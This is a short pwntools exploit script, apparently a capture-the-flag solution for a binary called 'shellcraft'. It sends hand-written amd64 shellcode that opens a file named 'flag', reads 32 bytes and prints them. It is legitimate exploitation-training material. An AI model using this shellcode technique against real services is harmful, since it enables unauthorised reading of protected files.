#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('shellcraft', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
brva 0x130D
'''


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()


if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
else:
    p = process([exe.path])
# GDB()
sc = asm('''
    mov rax, 1734437990
    push rax
    mov rsi, rsp
    mov rdi, -100
    mov rdx, 0
    mov rax, 0x101
    syscall
    mov rdi, rax
    mov rdx, 0x20
    mov rax, 0x0
    syscall
    mov rax, 0x1
    mov rdi, 0x1
    syscall    
         ''', arch='amd64')
p.send(sc)
p.interactive()
